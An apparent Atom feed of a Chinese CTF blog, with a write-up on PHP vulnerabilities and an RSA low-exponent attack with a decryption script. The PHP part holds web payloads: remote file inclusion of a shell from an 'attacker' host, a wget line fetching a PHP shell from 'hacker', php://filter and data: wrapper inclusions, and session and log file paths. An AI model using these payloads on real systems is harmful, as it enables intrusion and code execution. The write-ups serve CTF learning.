<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Two_smi1e</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.twosmi1e.com/"/>
  <updated>2018-08-21T13:23:17.309Z</updated>
  <id>https://www.twosmi1e.com/</id>
  
  <author>
    <name>two_smi1e</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CTF中遇到的PHP漏洞总结</title>
    <link href="https://www.twosmi1e.com/2018/08/21/CTF%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84PHP%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.twosmi1e.com/2018/08/21/CTF中遇到的PHP漏洞总结/</id>
    <published>2018-08-21T09:52:17.000Z</published>
    <updated>2018-08-21T13:23:17.309Z</updated>
    
    <content type="html"><![CDATA[<h2 id="md5-漏洞"><a href="#md5-漏洞" class="headerlink" title="md5()漏洞"></a>md5()漏洞</h2><p>&nbsp;&nbsp;PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。<br>常见的payload有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">QNKCDZO</div><div class="line"><span class="number">240610708</span></div><div class="line">s878926199a</div><div class="line">s155964671a</div><div class="line">s214587387a</div><div class="line">s214587387a</div><div class="line"> sha1(str)</div><div class="line">sha1(<span class="string">'aaroZmOk'</span>)  </div><div class="line">sha1(<span class="string">'aaK1STfY'</span>)</div><div class="line">sha1(<span class="string">'aaO8zKZF'</span>)</div><div class="line">sha1(<span class="string">'aa3OFF9m'</span>)</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;同时MD5不能处理数组，若有以下判断则可用数组绕过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(@md5($_GET[<span class="string">'a'</span>]) == @md5($_GET[<span class="string">'b'</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"yes"</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//http://127.0.0.1/1.php?a[]=1&amp;b[]=2</span></div></pre></td></tr></table></figure></p><p>判断代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))<span class="comment">//D0g3某道题</span></div></pre></td></tr></table></figure></p><h2 id="strcmp-漏洞"><a href="#strcmp-漏洞" class="headerlink" title="strcmp()漏洞"></a>strcmp()漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int strcmp(string $str1, string $str2)</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。<br>当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $password=$_GET[<span class="string">'password'</span>];</div><div class="line">    <span class="keyword">if</span> (strcmp(<span class="string">'*****'</span>,$password)) &#123;</div><div class="line">     <span class="keyword">echo</span> <span class="string">'NO!'</span>;</div><div class="line">    &#125; <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'YES!'</span>;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;对于这段代码，我们能用什么办法绕过验证呢， 只要我们\$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢。<br>其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key），当作一个名字为xxx的数组构造类似如下的request<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">POST /login HTTP/1.1</div><div class="line">Host: xxx.com</div><div class="line">Content-Length: 41</div><div class="line">Accept: application/json, text/javascript</div><div class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Connection: close</div><div class="line"></div><div class="line">password[]=admin</div></pre></td></tr></table></figure></p><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">include</span>()</div><div class="line"><span class="keyword">require</span>()</div><div class="line"><span class="keyword">include_once</span>()</div><div class="line"><span class="keyword">require_once</span>()</div></pre></td></tr></table></figure><p>这四个函数会将包含的文件作为php文件解析</p><p>_once表示同名文件只引入一次，include在引入不存文件时产生一个警告且脚本还会继续执行，require则会导致一个致命性错误且脚本停止执行。<br>include()是有条件包含函数，而 require()则是无条件包含函数<br>include有返回值，而require没有<br>理论上来说：include和require后面加不加括号对执行结果没有区别，但是加上括号效率较低，所以后面能不加括号就不加括号。</p><p>可利用的文件包含漏洞条件：<br>1.include()等函数通过动态变量方式引入需要包含的文件<br>2.用户可控制该动态变量</p><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$file = $_GET[<span class="string">'file'</span>];</div><div class="line"><span class="keyword">include</span> $file;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>若在同目录下有phpinfo.txt<figure class="highlight plain"><figcaption><span>phpinfo; ?>``` 则访问：</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">```</div><div class="line">index.php?file=phpinfo.txt</div></pre></td></tr></table></figure></p><p>即可解析文件内容<br>PHP内核是由C语言实现的，在连接字符串时，0字节(\x00)将作为字符串结束符。所以可用%00截断</p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><ol><li>allow_url_fopen = On</li><li>allow_url_include = On  默认为off<br>需要php.ini中两个配置均为ON</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($route == <span class="string">"share"</span>)&#123;</div><div class="line"><span class="keyword">require_once</span> $basePath . <span class="string">'/action/m_share.php'</span>;</div><div class="line">&#125;<span class="keyword">elseif</span>($route == <span class="string">"sharelink"</span>)&#123;</div><div class="line"><span class="keyword">require_once</span> $basePath . <span class="string">'/action/m_sharelink.php'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>构造url<br><code>/?param=http://attacker/phpshell.txt?</code><br>可将远程的shell解析执行，最后一个问号可以起到截断的作用。</p><h3 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h3><h4 id="利用用户上传文件"><a href="#利用用户上传文件" class="headerlink" title="利用用户上传文件"></a>利用用户上传文件</h4><p>如果有上传点或者允许用户上传文件可以利用，不过比较难找到文件目录。</p><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p><code>allow_url_include = on</code><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 index.php?file=php://input</div><div class="line">2 POST:</div><div class="line">3 &lt;? phpinfo(); ?&gt;</div></pre></td></tr></table></figure></p><hr><h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p>可以读取本地文件<br><code>index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code><br>指定末尾文件，可以读到base64编码后的文件内容，ctf中常有题目可读文件源码。</p><h5 id="php-phar"><a href="#php-phar" class="headerlink" title="php://phar"></a>php://phar</h5><p>PHP归档，解压缩协议<br>上传包含任何格式文件shell的压缩包，再用phar协议解析</p><ul><li>指定相对路径</li></ul><p><code>index.php?file=phar://shell.zip/phpinfo.txt</code></p><ul><li>指定绝对路径</li></ul><p><code>index.php?file=phar://D:/index/www/fileinclude/shell.zip/phpinfo.txt</code></p><h5 id="data"><a href="#data" class="headerlink" title="data:"></a>data:</h5><p>条件：</p><ol><li>allow_url_fopen = On</li><li>allow_url_include = On</li></ol><p><code>index.php?file=data:text/plain,&lt;?php phpinfo(); ?&gt;%00</code><br><code>index.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p><h4 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h4><p>先通过读取httpd的配置文件httpd.conf,找日志文件所在目录<br>常见日志文件位置：</p><ol><li>../etc/httpd/conf/httpd.conf</li><li>/usr/local/apache/conf/http.conf</li><li>../apache/logs/error.log</li></ol><p>Metasploit有脚本完成自动化攻击</p><h4 id="包含Session"><a href="#包含Session" class="headerlink" title="包含Session"></a>包含Session</h4><p>要求攻击者能控制部分Session的内容<br>常见的php-session存放位置：</p><ol><li>/var/lib/php/sess_PHPSESSID</li><li>/var/lib/php/sess_PHPSESSID</li><li>/tmp/sess_PHPSESSID</li><li>/tmp/sessions/sess_PHPSESSID</li></ol><h4 id="包含-proc-self-environ-文件"><a href="#包含-proc-self-environ-文件" class="headerlink" title="包含/proc/self/environ 文件"></a>包含/proc/self/environ 文件</h4><p><code>index.php?page=../../../../../proc/self/environ</code><br>可以看到Web进程运行时的环境变量，其中用户可以控制部分，比如对User-Agent注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">system(<span class="string">'wget http://hacker/Shells/phpshell.txt -O shell.php'</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><h4 id="包含上传的临时文件"><a href="#包含上传的临时文件" class="headerlink" title="包含上传的临时文件"></a>包含上传的临时文件</h4><h4 id="包含其他应用创建的文件"><a href="#包含其他应用创建的文件" class="headerlink" title="包含其他应用创建的文件"></a>包含其他应用创建的文件</h4><p>如数据库文件，缓存文件</p><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><ol><li>%00截断<br> <code>magic_quotes_gpc = off</code><br> PHP &lt; 5.3.4</li><li><p>字节长度截断：最大值Windows下256字节，Linux下4096字节</p></li><li><p>%00截断目录遍历<br> /var/www/%00<br> <em>magic_quotes_gpc = off</em></p></li><li><p>编码绕过</p><ul><li>%2e%2e%2f   ../</li><li>..%c0%af   ../</li><li>%2e%2e%5c  ..\<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3></li></ul></li><li>在很多场景中都需要去包含web目录之外的文件，如果php配置了<strong>open_basedir</strong>，则会包含失败</li><li>做好文件的权限管理</li><li>对危险字符进行过滤等</li></ol><h2 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h2><h3 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h3><p>条件：<code>register_globals = ON</code> 4.2.0后默认关闭 5.4.0后已移除<br>例bugku某题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line"></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">include</span> <span class="string">"flag1.php"</span>;</div><div class="line">highlight_file(<span class="keyword">__file__</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'args'</span>]))&#123;</div><div class="line">    $args = $_GET[<span class="string">'args'</span>];</div><div class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,$args))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"args error!"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">eval</span>(<span class="string">"var_dump($$args);"</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<code>http://120.24.86.145:8004/index1.php?args=GLOBALS</code><br>因为有eval(“var_dump($$args);”); 直接用全局变量打印所有字符串即可得到flag</p><h2 id="strpos-的小坑"><a href="#strpos-的小坑" class="headerlink" title="strpos()的小坑"></a>strpos()的小坑</h2><h3 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h3><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>查找”touch”在字符串中第一次出现的位置：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> strpos(<span class="string">"love is a touch and yet not a touch"</span>, <span class="string">"touch"</span>)</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。<br>strpos() 函数对大小写敏感。<br>该函数是二进制安全的。<br><code>strpos(string, find, start)</code> <em>string</em> 和 <em>find</em> 必需，<em>start</em> 可选，规定在何处开始搜索。</p><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><ul><li><strong>stripos()</strong> - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</li><li><strong>strripos()</strong> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><strong>strrpos()</strong> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>判断的时候是不能用 <em>!= false</em>来判断的，因为当查找的字符串位置为0 时也会判断成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$a = <span class="string">"stark"</span>;</div><div class="line">$b = <span class="string">"s"</span>;</div><div class="line">$c = <span class="string">"k"</span>;</div><div class="line"></div><div class="line">var_dump(strpos($a, $b));</div><div class="line">var_dump(strpos($a, $c));</div><div class="line">var_dump(strpos($a, $b) != <span class="keyword">false</span>);</div><div class="line">var_dump(strpos($a, $b) !== <span class="keyword">false</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>返回结果：<br><img src="/2018/08/21/CTF中遇到的PHP漏洞总结/1534852773118.png" alt="Alt text"></p><h2 id="PHP的一个小特性"><a href="#PHP的一个小特性" class="headerlink" title="PHP的一个小特性"></a>PHP的一个小特性</h2><p>乌云链接：<a href="https://wooyun.shuimugan.com/bug/view?bug_no=64792" target="_blank" rel="external">https://wooyun.shuimugan.com/bug/view?bug_no=64792</a><br>当代码中存在<em>\$_REQUEST[‘user_id’]</em>里面类似的参数的时候，我们在url上可以这样<em>a.php?user.id</em>传参去进行绕过,这样进去之后也能表示<em>$_REQUEST[‘user_id’]</em>的值，同样可以绕过的符号还有+，[ 等，应该说是php的一个小特性 </p><blockquote><p>安恒月赛 奇怪的恐龙特性</p></blockquote><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); </div><div class="line">error_reporting(<span class="number">0</span>); </div><div class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">'A_A'</span>])?$_GET[<span class="string">'A_A'</span>]:<span class="string">'A_A'</span>;</div><div class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">"A_A"</span>) !==<span class="keyword">false</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'A_A,have fun'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too small'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">elseif</span> ((string)$str&gt;<span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">'A_A,too big'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</div><div class="line">    </div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>阅读代码发现，首先第一步要绕过A_A这个符号，如果出现这个符号他就会显示A_A,have fun，就不能继续往下面执行到file_get_contents(‘flag.php’)了，但是我们发送get参数的时候又必须要发送，因此我们就用到刚才的知识点，我们可以用A.A或者是A+A去传参去绕过。<br>下面的代码就是常规的数字绕过了，但这里也用到了一个trick，就是无论你的数字多大，对于数组而言总是比数组小。</p><p>利用数组去绕过$str&lt;9999999999的特性，下面一个判断是强制转化为字符串在与数字比较的判断，这就是平常操作很多的弱类型了，直接让参数等于admin就可以了，因为“admin”== 0 ，结果是true，直接等于0绕过即可，所以这题的payload<br><code>http://101.71.29.5:10007/?A+A[]=admin</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;md5-漏洞&quot;&gt;&lt;a href=&quot;#md5-漏洞&quot; class=&quot;headerlink&quot; title=&quot;md5()漏洞&quot;&gt;&lt;/a&gt;md5()漏洞&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
      <category term="php" scheme="https://www.twosmi1e.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Crypto中RSA题目总结</title>
    <link href="https://www.twosmi1e.com/2018/08/18/Crypto%E4%B8%ADRSA%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    <id>https://www.twosmi1e.com/2018/08/18/Crypto中RSA题目总结/</id>
    <published>2018-08-18T11:50:19.000Z</published>
    <updated>2018-09-03T11:51:51.210Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-RSA算法简述"><a href="#0x00-RSA算法简述" class="headerlink" title="0x00 RSA算法简述"></a>0x00 RSA算法简述</h3><hr><h4 id="密钥的产生"><a href="#密钥的产生" class="headerlink" title="密钥的产生"></a>密钥的产生</h4><p>① 选择两个满足需要的大素数p和q，计算<strong>n=p×q,φ(n)= (p-1)×(q-1)</strong>，其中φ(n)是n的欧拉函数值。<br>② 选一个整数e,满足1&lt;e&lt;φ(n)，且gcd(φ(n),e)=1。通过<strong>d×e≡1modφ(n)</strong>，计算出d。<br>③ 以{e,n}为公开密钥，{d,n}为秘密密钥。<br>假设Alice是秘密消息的接收方，则只有Alice知道秘密密钥{d,n}，所有人都可以知道公开密钥{e,n}。</p><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><p>如果想发送消息m给Alice，就选择Alice的公钥{e,n}，然后计算：$c≡m^e mod n$，然后把c发送给Alice。</p><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>接收方Alice收到c，用私钥计算：$m≡c^dmodn$</p><p><img src="/2018/08/18/Crypto中RSA题目总结/1526955463464.png" alt="Alt text"></p><ul><li><strong>能够抵御选择明文攻击</strong></li><li><strong>RSA的安全性基于分解大整数难题</strong></li></ul><p>（1）不同的用户不能用相同的模数n. 大素数的个数是十分庞大的资源，不用担心会被用完。<br>（2）p与q的差值要大<br>（3）p-1和q-1都应有大的素因子。<br>（4）私钥d的选择。如果私钥d的值比较小，由RSA的解密算法可知，对数据进行解密的速度越快。但是，私钥d的值不能太小，一般要求d≥n1/4。<br>（5）更换密钥<br>如果私钥d被泄露，则在模n的情况下重新计算一对密钥是不够的，而是必须选择一个新的公钥n.<br>（6）e不可太小，否则不安全。</p><h3 id="0x01-数据处理"><a href="#0x01-数据处理" class="headerlink" title="0x01 数据处理"></a>0x01 数据处理</h3><hr><p>基本上来说，RSA的题目都是围绕着c，m，e，d，n，p，q这几个参数展开的，但是题目一般不会直接给这种样子的参数，而是通过别的方式给出，这里就需要我们使用一些工具或者自己手工将这些参数提取出来。</p><p>pem文件：针对此类文件可以直接使用openssl提取，大概使用过的方式有：</p> <figure class="highlight plain"><figcaption><span>rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">```openssl   rsa -pubin -text -modulus -in warmup -in public.pem</div></pre></td></tr></table></figure><p>pcap文件：针对此类文件可以使用wireshark follow一下。这种问题一般都是写了一个交互的crypto系统，所以可能产生多轮交互。</p><p>PPC模式：这种模式是上述pcap文件的交互版，会给一个端口进行一些crypto的交互，参数会在交互中给出。</p><h3 id="0x02-模数分解"><a href="#0x02-模数分解" class="headerlink" title="0x02 模数分解"></a>0x02 模数分解</h3><p>  解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。拿到题目先尝试能否将n分解成功，若成功得到p，q的取值，那么可求n的欧拉函数的值。</p><p>$$ varphi(n)=(p-1)(q-1) $$</p><h3 id="0x03-低加密指数攻击"><a href="#0x03-低加密指数攻击" class="headerlink" title="0x03 低加密指数攻击"></a>0x03 低加密指数攻击</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>e又被称为加密指数，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p><p><strong>推荐在e=3时首先尝试此方法</strong></p><p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p><p>如果e=3，且$ m^e&lt;{n} $，那么$ c= m^e,$ $e=3$，即：<br>$$ m = sqrt[3]{c} $$<br>如果明文的三次方比n大，但是不是足够大，那么设k，有：</p><p>$$ c= m^e+kn $$</p><p>爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><blockquote><p>安恒月赛<br>e = 3<br>n=0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L<br>c=0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</p></blockquote><h5 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> gmpy2 </div><div class="line"></div><div class="line">e = <span class="number">3</span></div><div class="line">n = <span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span></div><div class="line">c = <span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'n='</span>, n</div><div class="line"><span class="keyword">print</span> <span class="string">'c='</span>, c</div><div class="line">i = <span class="number">0</span></div><div class="line">result = gmpy2.iroot(c, <span class="number">3</span>)</div><div class="line"><span class="keyword">print</span> result</div><div class="line"><span class="keyword">print</span> (<span class="string">'&#123;:x&#125;'</span>.format(result[<span class="number">0</span>])).decode(<span class="string">'hex'</span>)</div></pre></td></tr></table></figure><p><img src="/2018/08/18/Crypto中RSA题目总结/1533317716345.png" alt="Alt text"></p><p><strong>gmpy2.iroot(m, n)函数</strong>：获取m开n次方的结果，返回一个tuple，第一个数为结果，第二个数为是否为整数的布尔值。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-RSA算法简述&quot;&gt;&lt;a href=&quot;#0x00-RSA算法简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 RSA算法简述&quot;&gt;&lt;/a&gt;0x00 RSA算法简述&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;密钥的产生&quot;&gt;&lt;a href=&quot;#密钥的
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTF中遇到的隐写术总结</title>
    <link href="https://www.twosmi1e.com/2018/08/03/CTF%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%9A%90%E5%86%99%E6%9C%AF%E6%80%BB%E7%BB%93/"/>
    <id>https://www.twosmi1e.com/2018/08/03/CTF中遇到的隐写术总结/</id>
    <published>2018-08-02T17:05:33.000Z</published>
    <updated>2018-08-27T11:16:36.691Z</updated>
    
